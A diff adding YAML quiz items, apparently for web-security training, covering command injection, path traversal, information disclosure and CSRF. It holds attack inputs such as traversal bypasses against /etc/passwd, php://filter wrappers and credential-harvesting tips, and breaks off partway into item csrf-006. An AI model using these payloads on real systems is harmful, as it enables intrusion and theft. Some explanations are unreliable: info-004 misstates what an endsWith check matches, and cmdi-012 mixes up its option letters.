+    explanation: "The input `evil.attacker.com` passes the regex perfectly (all alphanumeric and dots) but can resolve to any IP address, including internal ones (127.0.0.1, 10.x.x.x, 192.168.x.x). While this isn't command injection, it achieves SSRF-like impact through DNS. The attacker controls where the ping goes. Option B is incorrect — while alphanumeric shell payloads exist in CTF contexts, they require characters beyond what this regex allows and wouldn't work in a simple `ping` command context. Option C correctly assesses the command injection risk but misses the DNS abuse. Option D is not realistic for modern implementations."
+
+  - id: cmdi-012
+    topic: command-injection
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "Which of these Node.js code snippets is vulnerable to command injection?\n```\nA: execFile('/usr/bin/convert', [input_filename, 'output.png'])\nB: exec('convert ' + input_filename + ' output.png')\nC: execSync(`convert ${input_filename} output.png`)\nD: spawn('convert', [input_filename, 'output.png'])\n```"
+    options:
+      - a: "Only B — exec() passes the command through a shell which interprets metacharacters"
+      - b: "B and C — both pass strings to a shell; exec uses callback-style and execSync blocks but both use shell interpretation"
+      - c: "All four — any function that passes user input to an external program is vulnerable"
+      - d: "B, C, and A — execFile is vulnerable because it looks up the binary in PATH"
+    answer: "b"
+    explanation: "Both exec() and execSync() pass their command string through /bin/sh, which interprets shell metacharacters in input_filename. execFile() and spawn() use the array form to pass arguments directly to the executable without a shell, making them safe from command injection (though not argument injection). Option A is wrong because execFile is safe — it's the array-argument counterpart to exec. Option C is wrong because execFile and spawn don't use a shell. Option D is wrong about execFile — looking up binaries in PATH is unrelated to command injection."
+
+  # ============================================================
+  # PATH TRAVERSAL (12 questions)
+  # ============================================================
+
+  - id: pt-001
+    topic: path-traversal
+    type: defense-bypass
+    difficulty: advanced
+    question: "An application removes `../` sequences from file paths using a single pass of string replacement. Which input bypasses this?"
+    options:
+      - a: "`....//....//etc/passwd` — after removing `../`, the remaining characters form `../../etc/passwd`"
+      - b: "`..%2F..%2Fetc/passwd` — URL encoding of the slash bypasses the string match"
+      - c: "`%2e%2e/%2e%2e/etc/passwd` — URL encoding of the dots bypasses the string match"
+      - d: "All three could work depending on where in the processing pipeline the filter and URL decoding occur"
+    answer: "d"
+    explanation: "All three are valid bypass techniques in different contexts. Option A exploits single-pass replacement — `....//` contains `../` in the middle, and removing it leaves `../`. Option B works if the filter runs AFTER URL decoding (the %2F is already decoded to / before the filter sees it). Option C works similarly with encoded dots. The correct answer depends on the application's processing order: does URL decoding happen before or after the filter? A robust defense requires recursive replacement AND handling URL encoding."
+
+  - id: pt-002
+    topic: path-traversal
+    type: tricky-concept
+    difficulty: advanced
+    question: "On a Java application server, null byte injection (`%00`) in file paths used to bypass extension checks. Why does this no longer work in modern Java?"
+    options:
+      - a: "Java now uses UTF-16 internally, and null bytes have a different representation that doesn't terminate strings"
+      - b: "Since Java 7u40, the File and Path APIs explicitly check for and reject null bytes in path strings, throwing InvalidPathException"
+      - c: "Modern application servers URL-decode null bytes before Java processes them, so they're caught by standard input validation"
+      - d: "The JVM now runs in a sandbox that prevents any file system access outside the application directory"
+    answer: "b"
+    explanation: "Java explicitly added null byte checks in its file I/O APIs. Any path containing a null character now throws an exception before the OS even sees it. Previously, Java passed the null byte to the OS (C-based), which terminated the string at the null, ignoring any appended extension. Option A is wrong — Java has always used UTF-16, and that's not what fixed the issue. Option C describes a web server behavior, not a Java fix. Option D is wrong — Java doesn't sandbox file access by default."
+
+  - id: pt-003
+    topic: path-traversal
+    type: scenario
+    difficulty: intermediate
+    question: "An application resolves user-provided paths and checks that the canonical path starts with `/var/uploads/`. An attacker creates a symbolic link inside `/var/uploads/` pointing to `/etc/`. How does this bypass the check?"
+    options:
+      - a: "The canonical path of `/var/uploads/symlink/passwd` resolves to `/var/uploads/symlink/passwd` — the check passes because the prefix matches, but the file actually read is `/etc/passwd`"
+      - b: "Canonicalization resolves symlinks, so `/var/uploads/symlink/passwd` canonicalizes to `/etc/passwd`, which would FAIL the prefix check — the attack doesn't work"
+      - c: "The symlink makes the check throw an exception because circular references are detected, and the exception handler serves the file without the check"
+      - d: "Symbolic links bypass the canonical path check because the kernel follows them at a lower level than Java's canonicalization function"
+    answer: "b"
+    explanation: "This is a trick question. Canonicalization in most languages (Java's getCanonicalPath(), Python's os.path.realpath()) DOES resolve symbolic links. So `/var/uploads/symlink/passwd` canonicalizes to `/etc/passwd`, the prefix check fails, and the attack is blocked. The defense works correctly here. Option A incorrectly describes canonicalization behavior — it does follow symlinks. Option C fabricates exception behavior — non-circular symlinks resolve normally. Option D is wrong — canonicalization functions do resolve symlinks through kernel calls."
+
+  - id: pt-004
+    topic: path-traversal
+    type: defense-bypass
+    difficulty: advanced
+    question: "A Windows-based application validates that uploaded file paths don't contain `..` or `/`. Which input can still achieve path traversal?"
+    options:
+      - a: "`..\\..\\windows\\system.ini` — Windows uses backslashes as path separators, which the filter doesn't block"
+      - b: "`file:///C:/windows/system.ini` — the file:// URI scheme bypasses path validation entirely"
+      - c: "`C:\\windows\\system.ini` — absolute paths bypass relative path traversal checks"
+      - d: "Both A and C — the filter only blocks `..` and forward slashes, missing backslashes and absolute Windows paths"
+    answer: "d"
+    explanation: "The filter blocks `..` and `/` but Windows uses `\\` as the path separator. Input `..\\..\\windows\\system.ini` achieves traversal using backslashes. Additionally, absolute paths like `C:\\windows\\system.ini` bypass relative traversal checks entirely — there's no `..` or `/` to filter. Option B is unlikely to work — most file APIs don't process URI schemes directly. Both A and C represent distinct bypass categories that the filter misses."
+
+  - id: pt-005
+    topic: path-traversal
+    type: tricky-concept
+    difficulty: advanced
+    question: "An application uses `path.join()` in Node.js to combine a base directory with user input: `path.join('/var/uploads', userInput)`. Is this safe against path traversal?"
+    options:
+      - a: "Yes — path.join() normalizes the path and always keeps it within the base directory"
+      - b: "No — path.join('/var/uploads', '../../etc/passwd') returns '/etc/passwd' because join normalizes but doesn't enforce directory boundaries"
+      - c: "Yes — path.join() throws an error if the result would be outside the first argument's directory"
+      - d: "It depends on the operating system — path.join() is safe on Linux but not on Windows due to drive letter prefixes"
+    answer: "b"
+    explanation: "path.join() normalizes path components (resolving . and ..) but does NOT enforce that the result stays within any particular directory. `path.join('/var/uploads', '../../etc/passwd')` happily returns `/etc/passwd`. The developer must manually check that the resolved path starts with the intended base directory using `path.resolve()` and prefix comparison. Option A is a dangerous misconception — join is for path construction, not security. Option C is wrong — join never throws for traversal. Option D is wrong — the lack of boundary enforcement is platform-independent."
+
+  - id: pt-006
+    topic: path-traversal
+    type: scenario
+    difficulty: advanced
+    question: "You find a file download endpoint that checks `realpath(base_dir + filename).startswith(base_dir)`. The base_dir is `/var/www/uploads` (no trailing slash). How can you bypass this check?"
+    options:
+      - a: "Use `../../etc/passwd` — realpath won't resolve it correctly if the intermediate directories don't exist"
+      - b: "Request a filename that starts with the base_dir prefix: `/var/www/uploads_evil/secret.txt` from a directory you've created via a file upload vulnerability"
+      - c: "Use double URL encoding: `%252e%252e%252f` to bypass the realpath resolution"
+      - d: "Use a very long path that overflows the buffer used by realpath"
+    answer: "b"
+    explanation: "The subtle bug is the missing trailing slash in base_dir. The check is `startswith('/var/www/uploads')` which also matches `/var/www/uploads_evil/`, `/var/www/uploadsbackup/`, etc. If the attacker can create or access a sibling directory whose name starts with 'uploads', they bypass the check. The fix is to ensure base_dir ends with `/`: `startswith('/var/www/uploads/')`. Option A is wrong — realpath typically fails on non-existent paths, which would make the check fail (safe). Option C is wrong — realpath operates on the file system, not URL-encoded strings. Option D is not realistic with modern realpath implementations."
+
+  - id: pt-007
+    topic: path-traversal
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "Consider this PHP code:\n```php\n$lang = $_GET['lang'];\ninclude('/var/www/templates/' . $lang . '.php');\n```\nThe developer argues this is safe because the .php extension is appended. On PHP < 5.3, what bypasses this?"
+    options:
+      - a: "Null byte injection: `lang=../../etc/passwd%00` — the null byte terminates the string before .php is appended at the C level"
+      - b: "PHP stream wrappers: `lang=php://filter/convert.base64-encode/resource=../../etc/passwd` — the wrapper ignores the .php suffix"
+      - c: "Long path truncation: sending a filename padded with `/.` repeated to exceed PHP's path length limit, causing the .php suffix to be truncated"
+      - d: "All three are valid bypass techniques for this code on PHP < 5.3"
+    answer: "d"
+    explanation: "All three work on older PHP versions. Null byte (%00) terminates the C-string before .php is appended. PHP stream wrappers like php://filter process the path according to their own rules, and the appended .php may be ignored or cause a non-fatal error. Path truncation exploits the max path length (4096 on Linux) — padding the path to this limit causes the .php extension to be silently truncated. Modern PHP (5.3+) blocks null bytes, but stream wrappers and path truncation remained viable for longer."
+
+  - id: pt-008
+    topic: path-traversal
+    type: defense-bypass
+    difficulty: advanced
+    question: "An application URL-decodes user input, then checks for `..` sequences, and rejects them. Which encoding technique bypasses this defense?"
+    options:
+      - a: "Double URL encoding: `%252e%252e%252f` — the application decodes to `%2e%2e%2f`, which passes the `..` check, then the web server or framework decodes again to `../`"
+      - b: "UTF-8 overlong encoding: using multi-byte UTF-8 sequences to represent `.` and `/` characters"
+      - c: "HTML entity encoding: `&#46;&#46;&#47;` to represent `../`"
+      - d: "Base64 encoding: `Li4v` (base64 of `../`) which the application might auto-decode"
+    answer: "a"
+    explanation: "Double URL encoding is the classic bypass for decode-then-check defenses. The application decodes %252e to %2e (which is not `..`), passes the security check, then a downstream component (proxy, framework, OS) decodes %2e to `.`, creating the traversal sequence. Option B used to work against older web servers (IIS 4/5) but modern servers reject overlong encodings per the UTF-8 spec. Option C only works in HTML rendering contexts, not in file path processing. Option D requires the application to explicitly base64-decode the input, which is not standard behavior."
+
+  - id: pt-009
+    topic: path-traversal
+    type: scenario
+    difficulty: intermediate
+    question: "A cloud application stores files in S3 and generates download URLs by concatenating user input into the S3 key: `s3://bucket/user-files/{user_id}/{filename}`. What path traversal risk exists in cloud object storage?"
+    options:
+      - a: "S3 keys are flat strings with no directory hierarchy — `../` in the filename literally navigates up directories"
+      - b: "S3 keys don't have a real directory structure, but `../` in the key might cause the SDK or application to normalize the path before making the API call, potentially accessing other users' files"
+      - c: "S3 prevents all traversal because IAM policies are enforced at the bucket level, not the key level"
+      - d: "S3 is immune to path traversal because object storage has no concept of parent directories"
+    answer: "b"
+    explanation: "While S3 itself treats keys as opaque strings (there's no real directory hierarchy), the vulnerability lies in the application layer or SDK. If the application or AWS SDK normalizes the path (resolving ../) before constructing the S3 API request, `filename=../../other-user-id/secret.pdf` could access another user's files. Option A incorrectly describes S3 as having real directories. Option C is wrong — IAM policies can use key prefixes, but the traversal might stay within the allowed prefix. Option D is wrong — the application layer can still be tricked even if S3 itself doesn't traverse."
+
+  - id: pt-010
+    topic: path-traversal
+    type: tricky-concept
+    difficulty: advanced
+    question: "On Windows, which of these file path quirks can be exploited for path traversal or access control bypass?"
+    options:
+      - a: "Alternate Data Streams (ADS): `file.txt::$DATA` accesses the default stream, potentially bypassing extension checks that don't account for the stream suffix"
+      - b: "8.3 short filenames: `PROGRA~1` is equivalent to `Program Files`, potentially bypassing path-based allowlists"
+      - c: "Trailing dots and spaces: `file.txt...` is equivalent to `file.txt` on Windows NTFS, bypassing extension filters"
+      - d: "All of the above — Windows has multiple path normalization quirks that can bypass security checks"
+    answer: "d"
+    explanation: "Windows has numerous path normalization behaviors that create security mismatches. ADS (::$DATA) can bypass extension checks. Short 8.3 filenames provide alternative names for long paths. Trailing dots and spaces are silently stripped by NTFS. Additionally, Windows is case-insensitive and treats both `/` and `\\` as path separators. All of these can bypass path-based security checks that don't account for Windows normalization."
+
+  - id: pt-011
+    topic: path-traversal
+    type: attack-chain
+    difficulty: intermediate
+    question: "You've discovered a path traversal vulnerability that allows reading arbitrary files from a Linux web server. You can read any file the web server process can access. What file should you read FIRST for maximum impact?"
+    options:
+      - a: "`/etc/passwd` — it reveals all system usernames which can be used for SSH brute-forcing"
+      - b: "The application's configuration file (e.g., `/var/www/app/config/database.yml`) — it likely contains database credentials, API keys, and other secrets"
+      - c: "`/etc/shadow` — it contains password hashes that can be cracked offline"
+      - d: "`/proc/self/environ` — it reveals environment variables of the running process, which often contain secrets, database URLs, and API keys"
+    answer: "d"
+    explanation: "/proc/self/environ exposes all environment variables of the web server process, which in modern applications typically contains database URLs, API keys, JWT secrets, cloud credentials, and other sensitive configuration. This is the highest-value single file for immediate credential harvest. Option A is low value — /etc/passwd rarely leads to direct exploitation. Option B requires guessing the application's path and config file name. Option C is almost never readable by the www-data user (requires root). Option D gives immediate access to runtime secrets without guessing file paths."
+
+  - id: pt-012
+    topic: path-traversal
+    type: defense-bypass
+    difficulty: advanced
+    question: "A Java application uses this validation:\n```java\nString canonical = new File(BASE_DIR, userInput).getCanonicalPath();\nif (!canonical.startsWith(BASE_DIR)) throw new SecurityException();\n```\nA TOCTOU (Time-of-Check-Time-of-Use) race condition exists. How?"
+    options:
+      - a: "Between canonicalization and use, an attacker with local access could replace a directory in the path with a symlink pointing outside BASE_DIR"
+      - b: "The canonical path changes if another thread modifies the BASE_DIR contents between the check and the file read"
+      - c: "Java's garbage collector might clear the canonical string from memory between check and use"
+      - d: "The getCanonicalPath() result is cached and may not reflect file system changes from concurrent requests"
+    answer: "a"
+    explanation: "If an attacker has any ability to modify the file system (e.g., via a file upload feature), they can exploit the window between getCanonicalPath() (check) and the actual file read (use). During this window, they replace a directory or file with a symlink pointing outside BASE_DIR. The check passes against the original path, but the subsequent read follows the symlink. Option B is wrong — modifications to BASE_DIR contents don't change other files' canonical paths. Option C is wrong — Java doesn't GC referenced strings. Option D is partially correct that canonicalization results can be stale, but the specific attack vector is symlink replacement, not caching."
+
+  # ============================================================
+  # INFORMATION DISCLOSURE (12 questions)
+  # ============================================================
+
+  - id: info-001
+    topic: information-disclosure
+    type: scenario
+    difficulty: intermediate
+    question: "You discover that `/.git/HEAD` returns `ref: refs/heads/main` on a production web server. What is the MOST impactful thing you can do?"
+    options:
+      - a: "Read the branch name — knowing it's 'main' vs 'master' reveals the organization's Git practices"
+      - b: "Reconstruct the entire source code repository by downloading Git objects from `.git/objects/` and parsing the Git data structures"
+      - c: "Identify the last developer who pushed by reading `.git/COMMIT_EDITMSG`"
+      - d: "Find deployment credentials in `.git/config` which might contain remote URLs with embedded tokens"
+    answer: "b"
+    explanation: "An exposed .git directory allows full repository reconstruction using tools like git-dumper. You can download all objects (commits, trees, blobs) and reconstruct the complete source code, including full commit history, which may contain accidentally-committed secrets, database credentials, API keys, and internal documentation. Option A is trivial information. Option C reveals minor information. Option D is possible and useful, but the full source code (Option B) is strictly more impactful — it includes the config file AND everything else."
+
+  - id: info-002
+    topic: information-disclosure
+    type: tricky-concept
+    difficulty: advanced
+    question: "A site returns CORS headers `Access-Control-Allow-Origin: *` on its API endpoints. The site also uses cookie-based authentication. Why is this actually NOT a vulnerability?"
+    options:
+      - a: "It IS a vulnerability — any site can read API responses and steal authenticated data"
+      - b: "Browsers refuse to send credentials (cookies) when the CORS response is `*` — the wildcard and `Access-Control-Allow-Credentials: true` are mutually exclusive"
+      - c: "The wildcard only allows GET requests — POST and PUT are still blocked by CORS preflight"
+      - d: "The wildcard only applies to the response headers, not the response body — so the data itself is still protected"
+    answer: "b"
+    explanation: "The CORS specification explicitly forbids combining `Access-Control-Allow-Origin: *` with `Access-Control-Allow-Credentials: true`. Browsers enforce this — when ACAO is `*`, cookies are not sent, so the API requests are unauthenticated. For credentials to be included, the server must echo the specific requesting origin. Option A would be true IF cookies were sent, but they aren't. Option C is wrong — the wildcard applies to all HTTP methods (after preflight if needed). Option D is wrong — ACAO controls access to the entire response including the body."
+
+  - id: info-003
+    topic: information-disclosure
+    type: scenario
+    difficulty: advanced
+    question: "A web application returns detailed stack traces for 500 errors in production. Beyond embarrassment, what is the MOST actionable information an attacker gains?"
+    options:
+      - a: "The programming language and framework version — enabling targeted CVE exploitation"
+      - b: "Full file system paths, internal function names, database query structures, and third-party library versions — providing a detailed map for further attacks"
+      - c: "The server administrator's name from code comments embedded in the stack trace"
+      - d: "Memory addresses that can be used for buffer overflow attacks against the web application"
+    answer: "b"
+    explanation: "Stack traces reveal a rich combination of actionable intelligence: absolute file paths (enabling path traversal with precision), SQL queries (revealing table/column names for SQL injection), framework and library versions (enabling known-CVE targeting), internal API endpoint paths (revealing hidden functionality), and class/function names (revealing business logic). Option A is true but too narrow — it's just one element of the broader disclosure. Option C is unlikely and low-value. Option D is wrong — web application memory addresses from managed languages (Java, Python, PHP) aren't useful for traditional buffer overflows."
+
+  - id: info-004
+    topic: information-disclosure
+    type: defense-bypass
+    difficulty: advanced
+    question: "A site's CORS policy dynamically reflects the Origin header into Access-Control-Allow-Origin but only for whitelisted domains. The whitelist check uses: `origin.endsWith('.example.com')`. How can an attacker bypass this?"
+    options:
+      - a: "Register the domain `evilexample.com` — the endsWith check will match because it ends with `example.com`"
+      - b: "Use a subdomain like `evil.example.com` — only registered subdomains should be allowed"
+      - c: "Send an Origin header with null value — some implementations whitelist the null origin"
+      - d: "Both A and C are viable attacks against this implementation"
+    answer: "d"
+    explanation: "Option A works because `endsWith('.example.com')` also matches `notexample.com` — the attacker registers `attackerexample.com` or any domain ending in `example.com`. Option C is a separate bypass — the `null` origin (sent by sandboxed iframes and redirects) is often accidentally whitelisted. Option B describes a legitimate subdomain which might or might not be authorized, but it's not an attack. The correct fix for A is to check `origin === 'https://example.com' || origin.endsWith('.example.com')` AND also match the scheme and ensure the dot is there."
+
+  - id: info-005
+    topic: information-disclosure
+    type: tricky-concept
+    difficulty: intermediate
+    question: "A login form responds with 'Invalid username' for non-existent users and 'Invalid password' for wrong passwords on existing accounts. The developer changes both to 'Invalid credentials'. Is the enumeration problem fully solved?"
+    options:
+      - a: "Yes — with identical messages, there's no way to distinguish between invalid usernames and wrong passwords"
+      - b: "No — the registration page likely still reveals whether an email is taken, and password reset may also differ"
+      - c: "No — but only because response times may differ (database lookup for existing users takes longer)"
+      - d: "Both B and C — enumeration must be prevented consistently across ALL features and side channels"
+    answer: "d"
+    explanation: "User enumeration must be addressed holistically. Even with identical login error messages, attackers can enumerate via: registration ('email already exists'), password reset (different behavior for valid/invalid emails), response time differences (bcrypt comparison only runs for existing users), and even HTTP response size differences. Option A is wrong because it only addresses one of many channels. Option B identifies feature-level leaks but misses timing. Option C identifies timing but misses other features. Only Option D captures the full scope."
+
+  - id: info-006
+    topic: information-disclosure
+    type: scenario
+    difficulty: advanced
+    question: "You discover a timing side-channel: a search API takes 2ms for zero results but 50ms+ for results that exist but are access-controlled (returning 'Access Denied'). What can you infer and exploit?"
+    options:
+      - a: "Nothing useful — the timing only tells you the database is slower under load"
+      - b: "You can enumerate which search terms match restricted resources by measuring response times, even though you can't see the resources themselves"
+      - c: "The timing difference reveals the database password through a cache-timing attack"
+      - d: "You can infer the number of restricted results based on the exact response time, but not their content"
+    answer: "b"
+    explanation: "The timing difference reveals whether restricted resources matching your query EXIST, even though you can't access them. This is a boolean information leak — you now know which search terms have hits in the restricted dataset. Depending on the application, this could reveal the existence of confidential projects, user accounts, financial records, etc. Option A dismisses a real side-channel. Option C fabricates a nonsensical attack. Option D partially captures the issue but overstates the precision — response time might roughly correlate with result count, but the key insight is the binary exists/doesn't-exist distinction."
+
+  - id: info-007
+    topic: information-disclosure
+    type: spot-the-vuln
+    difficulty: intermediate
+    question: "An API returns user profiles. For the authenticated user: `{\"id\": 1, \"name\": \"Alice\", \"email\": \"a@b.com\", \"role\": \"user\"}`. For other users: `{\"id\": 2, \"name\": \"Bob\"}`. An attacker notices that requesting a specific admin user returns: `{\"id\": 99, \"name\": \"Admin\"}`. What information is disclosed?"
+    options:
+      - a: "The admin's name is disclosed, which enables targeted social engineering"
+      - b: "The sequential ID (99) reveals there are at least 99 users, enabling IDOR enumeration of all user IDs"
+      - c: "The different response structure (2 fields vs 4 fields) confirms user 99 exists and the requester doesn't have access — but no sensitive data is leaked"
+      - d: "The presence of a response at all (instead of 404) confirms user ID 99 exists, AND the response structure is the same for any non-self user, so the admin role isn't actually disclosed"
+    answer: "d"
+    explanation: "The question tests careful observation. The 'other user' response always returns just id and name, whether the target is a regular user or admin. No role information is actually leaked — the attacker can confirm the user EXISTS but can't determine they're an admin from this response alone. Option A identifies the name but not the role. Option B is a valid general concern about sequential IDs but isn't the MOST relevant finding here. Option C is closest but claims 'no sensitive data' which overlooks that confirming user existence is itself information disclosure."
+
+  - id: info-008
+    topic: information-disclosure
+    type: defense-bypass
+    difficulty: advanced
+    question: "A developer implements custom error handling that catches all exceptions and returns a generic 500 response. However, the application still leaks information. What is the MOST likely remaining channel?"
+    options:
+      - a: "The response time differs between different exception types — a database timeout takes longer than a validation error"
+      - b: "The generic error page includes a support reference number that encodes the error type"
+      - c: "HTTP response headers from the framework still include Server, X-Powered-By, and version information"
+      - d: "All of the above represent distinct information disclosure channels that survive generic error handling"
+    answer: "d"
+    explanation: "Generic error pages address only the response body. Option A: Timing side-channels leak which code path was taken (database error vs validation vs authentication). Option B: Support reference numbers often encode error type, timestamp, or server ID. Option C: Response headers commonly expose server software (Apache/Nginx), framework (X-Powered-By: Express), and versions. A thorough approach must address body, headers, timing, and any metadata simultaneously."
+
+  - id: info-009
+    topic: information-disclosure
+    type: scenario
+    difficulty: intermediate
+    question: "You find that `robots.txt` on a corporate site contains:\n```\nDisallow: /admin/\nDisallow: /internal-api/\nDisallow: /jenkins/\nDisallow: /backup/db-dump/\n```\nWhat is the security impact?"
+    options:
+      - a: "None — robots.txt prevents search engine indexing, which actually improves security by hiding these paths"
+      - b: "It creates a roadmap of sensitive paths for attackers — robots.txt is publicly readable and meant for search engines, not access control"
+      - c: "Moderate — the paths are disclosed but can't be accessed without proper authentication"
+      - d: "Critical — robots.txt entries are automatically accessible to anyone who reads the file"
+    answer: "b"
+    explanation: "robots.txt is publicly accessible and intended only as a voluntary directive for search engine crawlers. It provides zero access control. By listing sensitive paths, the organization hands attackers a prioritized list of targets to probe. Even if authentication is required, the attacker now knows exactly where to look instead of guessing. Option A is dangerous thinking — hiding from search engines is not security. Option C understates the risk by assuming authentication works everywhere. Option D overstates it — the paths are disclosed but may still require authentication."
+
+  - id: info-010
+    topic: information-disclosure
+    type: tricky-concept
+    difficulty: advanced
+    question: "A REST API returns 403 Forbidden for resources that exist but you can't access, and 404 Not Found for resources that don't exist. Why is this a vulnerability?"
+    options:
+      - a: "It's not a vulnerability — different status codes for different conditions is proper REST API design"
+      - b: "It enables resource enumeration — an attacker can determine which resource IDs exist by distinguishing 403 from 404, even without accessing the resources"
+      - c: "The 403 response might include more information than the 404 in its error body"
+      - d: "It enables brute-force attacks because 403 responses are smaller and faster to process than 404s"
+    answer: "b"
+    explanation: "Distinguishing 'exists but unauthorized' (403) from 'doesn't exist' (404) leaks the existence of resources. An attacker can enumerate all valid resource IDs, which is the first step in many attack chains. The secure approach is to return 404 for all unauthorized access — pretend the resource doesn't exist. Option A reflects correct REST semantics but ignores the security implication. Option C is a secondary concern. Option D mischaracterizes the risk — the issue is enumeration, not brute-force optimization."
+
+  - id: info-011
+    topic: information-disclosure
+    type: attack-chain
+    difficulty: intermediate
+    question: "You discover a verbose error message that reveals: `ConnectionString: Server=db.internal.corp;Database=AppDB;User=sa;Password=Pr0d_Pw!`. What is the MOST impactful immediate action?"
+    options:
+      - a: "Try these credentials on the application's login page — developers often reuse database passwords for admin accounts"
+      - b: "Attempt direct database connection if the database port is exposed, since the 'sa' user typically has full SQL Server sysadmin privileges"
+      - c: "Search for the internal hostname db.internal.corp in DNS to find the database server's IP for port scanning"
+      - d: "Report the finding immediately since the connection string exposure is the vulnerability"
+    answer: "b"
+    explanation: "The 'sa' (system administrator) user is SQL Server's built-in superuser with complete control over the database server. Direct connection to the database would give full access to all databases, ability to execute OS commands via xp_cmdshell, read/write the file system, and potentially pivot to other systems. Option A is creative but lower impact than direct DB access. Option C is useful reconnaissance but indirect. Option D is appropriate for a pentest report but the question asks about immediate action for maximum impact."
+
+  - id: info-012
+    topic: information-disclosure
+    type: defense-bypass
+    difficulty: advanced
+    question: "A site prevents directory listing on its web server. You suspect a backup file exists but don't know its name. Which technique is MOST effective for discovery?"
+    options:
+      - a: "Try common backup file patterns: `backup.sql`, `backup.zip`, `db.sql.gz`, `site.tar.gz`, `.env.bak`"
+      - b: "Use the Wayback Machine (web.archive.org) to find historically-listed directory contents that may reference backup files"
+      - c: "Brute-force with a comprehensive wordlist using tools like dirbuster or feroxbuster that test thousands of common file/path patterns"
+      - d: "All of these are complementary techniques — effective discovery uses multiple approaches because each catches files the others miss"
+    answer: "d"
+    explanation: "No single technique reliably finds all hidden files. Common patterns (Option A) catch predictable names. Wayback Machine (Option B) reveals files that were once public. Wordlist brute-forcing (Option C) systematically tests thousands of names. In practice, security professionals use all three plus additional methods (Google dorking, checking .git/config for references, examining JavaScript for API paths, etc.). Each technique has blind spots that the others cover."
+
+  # ============================================================
+  # CSRF (6 questions)
+  # ============================================================
+
+  - id: csrf-001
+    topic: csrf
+    type: tricky-concept
+    difficulty: advanced
+    question: "A site sets `SameSite=Lax` on its session cookie (the current browser default). Under which scenario can CSRF STILL succeed?"
+    options:
+      - a: "A top-level GET request navigation — Lax allows cookies on top-level GET navigations, so CSRF works if the state-changing action accepts GET requests"
+      - b: "Any POST request from another site — SameSite=Lax doesn't restrict POST requests"
+      - c: "Subresource requests (img, script, iframe) from another site — Lax allows these"
+      - d: "No scenario — SameSite=Lax prevents all forms of cross-site request forgery"
+    answer: "a"
+    explanation: "SameSite=Lax allows cookies on top-level navigations (clicking a link that navigates the full page) using safe HTTP methods (GET). If a state-changing endpoint accepts GET requests (e.g., `/transfer?to=attacker&amount=1000`), an attacker can forge this as a simple link. Option B is wrong — Lax blocks cookies on cross-site POST requests. Option C is wrong — Lax blocks cookies on subresource requests (images, scripts, iframes). Option D is wrong because of the GET navigation exception."
+
+  - id: csrf-002
+    topic: csrf
+    type: defense-bypass
+    difficulty: advanced
+    question: "A REST API checks the `Content-Type: application/json` header and only processes JSON requests. The developer argues CSRF is impossible because HTML forms can't send JSON. What technique bypasses this?"
+    options:
+      - a: "Use `fetch()` from the attacker's page with `Content-Type: application/json` — the CORS preflight will block it but the simple request still goes through"
+      - b: "Use `navigator.sendBeacon()` with a Blob having type `application/json` — some browsers send this without a preflight"
+      - c: "Use a form with `enctype='text/plain'` and craft the form field name/value to look like valid JSON: `{\"amount\":1000,\"to\":\"attacker\"//}`"
+      - d: "Use an XMLHttpRequest with `withCredentials: true` and set the Content-Type — the browser allows this for same-origin requests"
+    answer: "c"
+    explanation: "HTML forms with `enctype='text/plain'` send the body as `name=value`. By carefully crafting the name to be `{\"amount\":1000,\"to\":\"attacker\"//` and the value to be `}`, the resulting body is valid-looking JSON: `{\"amount\":1000,\"to\":\"attacker\"//=}`. The `//` comments out the `=` in JSON parsers that support comments, or the API may be lenient. Option A is wrong — fetch() with a non-simple Content-Type triggers a preflight which WOULD be blocked. Option B is unreliable and browser-dependent. Option D is wrong — XMLHttpRequest from a cross-origin page still triggers CORS."
+
+  - id: csrf-003
+    topic: csrf
+    type: scenario
+    difficulty: intermediate
+    question: "A site includes the CSRF token in the URL of action links: `https://bank.com/transfer?csrf_token=abc123&to=alice&amount=100`. What is the security problem compared to putting the token in a hidden form field?"
+    options:
+      - a: "No difference — both locations provide equal CSRF protection"
+      - b: "URL tokens leak via the Referer header when the page contains links to external sites, via browser history, via server access logs, and via proxy logs"
+      - c: "URL tokens are vulnerable to XSS while form tokens are not"
+      - d: "URL tokens expire faster because browsers cache URLs differently"
+    answer: "b"
+    explanation: "Tokens in URLs leak through multiple channels: the Referer/Referrer header sent with any subsequent request (including to third-party resources like analytics), browser history (visible to other users of the same machine), server access logs (readable by anyone with log access), and proxy/CDN logs. Hidden form fields avoid all of these leaks. Option A ignores significant leakage vectors. Option C is wrong — both are equally vulnerable to XSS (XSS can read form fields too). Option D fabricates non-existent cache behavior."
+
+  - id: csrf-004
+    topic: csrf
+    type: tricky-concept
+    difficulty: advanced
+    question: "What is 'login CSRF' and why is it dangerous, even though the attacker isn't accessing the victim's account?"
+    options:
+      - a: "The attacker force-logs the victim into the ATTACKER'S account — the victim then enters sensitive data (credit cards, personal info) thinking it's their own account, but it's actually saved to the attacker's account"
+      - b: "Login CSRF steals the victim's credentials by presenting a fake login form on the legitimate domain"
+      - c: "Login CSRF exploits the login endpoint to brute-force credentials by automating login attempts through the victim's browser"
+      - d: "Login CSRF is a misnomer — the login page can't be CSRF'd because there's no session to ride"
+    answer: "a"
+    explanation: "Login CSRF is a subtle and underestimated attack. The attacker crafts a form that submits the ATTACKER'S credentials to the victim's browser, logging them into the attacker's account. The victim, believing they're in their own account, enters sensitive information (payment details, addresses, personal data), or performs searches that reveal private interests. All this activity is recorded in the attacker's account. Option B describes phishing, not CSRF. Option C describes brute-force, not CSRF. Option D is wrong — CSRF doesn't require an existing session; it creates one."
+
+  - id: csrf-005
+    topic: csrf
+    type: defense-bypass
+    difficulty: advanced
+    question: "A site validates CSRF tokens but the check is only enforced when a token is PRESENT. If the token parameter is completely omitted from the request, the server skips validation. How can an attacker exploit this?"
+    options:
+      - a: "Submit the form without the CSRF token field — the server skips validation and processes the request"
+      - b: "This isn't exploitable — browsers always send all form fields, so the token will always be present"
+      - c: "The attacker needs to find an XSS vulnerability to remove the token from the DOM before form submission"
+      - d: "Send the CSRF token with an empty value — the server will see it as present but invalid and reject it"
+    answer: "a"
+    explanation: "The attacker crafts their own HTML form on their malicious site that simply doesn't include the CSRF token field at all. When the victim's browser submits this form to the target site, the token parameter is absent. The server sees no token and skips validation entirely, processing the state-changing request. Option B is wrong — the attacker controls which fields their malicious form includes. Option C is unnecessary — the attacker doesn't need to modify the legitimate form. Option D describes the opposite of what we want — we want to OMIT the parameter, not send it empty."
+
+  - id: csrf-006
+    topic: csrf
+    type: spot-the-vuln
+    difficulty: intermediate
